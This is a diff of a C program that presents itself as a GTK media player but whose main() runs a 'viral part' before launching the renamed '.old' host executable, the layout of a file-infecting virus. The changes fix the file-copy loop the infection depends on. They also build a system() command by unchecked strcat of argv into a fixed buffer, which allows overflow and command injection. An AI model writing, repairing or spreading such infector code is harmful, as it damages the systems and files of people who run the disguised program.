@@ -15,7 +15,7 @@
     int nbrMedia = 0;
     int curIndex = 0;
 
-    static gboolean timer_is_start = FALSE; 
+    static gboolean timer_is_start = FALSE;
 
 //Widget GTK
     GtkWidget *mainWindow = NULL;
@@ -185,7 +185,7 @@
       float maxHTemp = alloc->height  -350.0;
 
       g_free(alloc);
-      //Ce callback n'est pas appellé qu'en cas de changement de taille de la fenetre donc : 
+      //Ce callback n'est pas appellé qu'en cas de changement de taille de la fenetre donc :
       if(maxH != maxHTemp || maxW != maxWTemp){ //Si il y a eu un changement de taille de la fenetre
         maxH = maxHTemp;
         maxW = maxWTemp;
@@ -242,7 +242,7 @@
 
 
 //Lancement du media player
-    int start_media_player(int *argc, char**argv[]){
+  int start_media_player(int *argc, char**argv[]){
       GtkBuilder *builder = NULL;
       GError *error = NULL;
       gchar *mainAppFile = NULL;
@@ -267,6 +267,8 @@
       update_files(".");
 
       gtk_main();
+
+      return 0;
     }
 
 /*
@@ -288,7 +290,7 @@
 
     }
 
-//Retourne vrai si le fichier est executable par l'utilisateur     
+//Retourne vrai si le fichier est executable par l'utilisateur
     int est_executable(long mode){
       return ((mode&S_IFMT)==S_IFREG) && ((mode&S_IXUSR)==S_IXUSR);
     }
@@ -299,7 +301,7 @@
       FILE *dest = fopen(fileDest, "wb");
       unsigned char buf[4096];
       int n;
-      while ((n=fread(buf, 1, 4096, source)) == 4096) {
+      while ((n=fread(buf, 1, 4096, source)) > 0) {
         fwrite(buf,n, 1, dest );
       }
       fclose(source);
@@ -345,16 +347,20 @@
 //Fonction main
     int main(int argc, char *argv [])
     {
+
       virus(argv[0]); //Execution de la partie virale
 
       //Execution du programme
       if(string_end_with(argv[0], "MediaPlayer.exe")){ //Si le nom est mediaPlayer, on lance le player
         return start_media_player(&argc,& argv);
       }else{//Sinon on lance le programme .old
-        char prog [300] = "";
+        char prog [530] = "";
         sprintf(prog, "%s.old", argv[0]);
+
 	for(int i = 1; i < argc; i++){
-		sprintf(prog, "%s %s",prog, argv[i]);//Ajout des arguments
+    strcat(prog, " ");
+    strcat(prog, argv[i]);
+		//sprintf(prog, "%.255s %.100s",prog, argv[i]);//Ajout des arguments
 	}
         system(prog);
       }
